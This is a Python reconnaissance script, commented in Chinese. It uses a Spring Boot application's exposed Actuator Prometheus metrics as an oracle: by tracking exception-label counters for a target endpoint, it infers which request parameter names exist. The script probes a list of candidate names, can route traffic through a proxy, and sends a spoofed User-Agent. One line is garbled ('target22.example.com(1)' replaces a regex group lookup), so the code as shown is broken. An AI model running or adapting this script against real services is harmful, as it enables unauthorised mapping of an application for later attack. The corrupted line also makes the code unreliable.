# -*- coding: utf-8 -*-
"""用 Actuator prometheus 的 exception 标签做参数名 oracle。

适用场景：Spring Boot 应用装了 Actuator 且暴露 /actuator/prometheus，
且其全局异常处理器把所有参数绑定失败都包装成"HTTP 200 + 固定 JSON"，
导致无法用响应体判定参数名是否正确。

原理：micrometer 的 http_server_requests_seconds_count 带 exception 标签，
按异常类型分别累计。参数名错 -> MissingServletRequestParameterException；
参数名对、类型错 -> MethodArgumentTypeMismatchException / HttpMessageNotReadableException；
参数名对、类型对（进入业务逻辑）-> 该 uri 的 Missing... 计数不增。
"""
import re
import time
import urllib.request

PROM = "http://TARGET:8081/actuator/prometheus"      # 指标端点（通常可直连）
EP = "http://TARGET:8081/data/api/confirmRelation"   # 待测接口
URI = "/data/api/confirmRelation"                    # 该接口在指标里的 uri 标签值
PROXY = None            # 如需换出口： "http://127.0.0.1:7892"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120"
INTERVAL = 1.6          # 两次拉指标之间的等待（等指标刷新）

NAMES = ["code", "id", "relationCode", "companyCode", "userId", "sign", "token", "appId"]

opener = (urllib.request.build_opener(
    urllib.request.ProxyHandler({"http": PROXY, "https": PROXY})) if PROXY
    else urllib.request.build_opener())


def counts():
    """返回 {exception_label: count} —— 只取目标 uri 的 count 指标。"""
    req = urllib.request.Request(PROM, headers={"User-Agent": UA})
    with urllib.request.urlopen(req, timeout=20) as r:
        txt = r.read().decode("utf-8", "replace")
    out = {}
    for line in txt.splitlines():
        if "http_server_requests_seconds_count" in line and ('uri="%s"' % URI) in line:
            m = re.search(r'exception="([^"]*)"', line)
            v = line.rsplit("}", 1)[-1].strip()
            try:
                out[target22.example.com(1) if m else "?"] = float(v)
            except ValueError:
                pass
    return out


def call(qs):
    url = EP + ("?" + qs if qs else "")
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    try:
        with opener.open(req, timeout=25) as r:
            return r.read().decode("utf-8", "replace")[:120]
    except Exception as e:
        return "<EXC %s: %s>" % (type(e).__name__, e)


if __name__ == "__main__":
    print("[baseline] %s" % counts())
    for name in NAMES:
        before = counts()
        resp = call("%s=1" % name)
        time.sleep(INTERVAL)
        after = counts()
        diff = {k: round(after.get(k, 0) - before.get(k, 0), 1)
                for k in set(list(after) + list(before))}
        diff = {k: v for k, v in diff.items() if v}
        miss = diff.get("MissingServletRequestParameterException", 0)
        print("%-16s miss=%-4s resp=%-34s diff=%s%s"
              % (name, miss, resp.replace("\n", ""), diff,
                 "" if miss else "   <<<<< 正确参数名"))
    # body 字段名变体：给候选字段塞对象/字符串触发反序列化失败，
    # 若该字段名存在于 DTO，则 HttpMessageNotReadableException 计数会 +1。
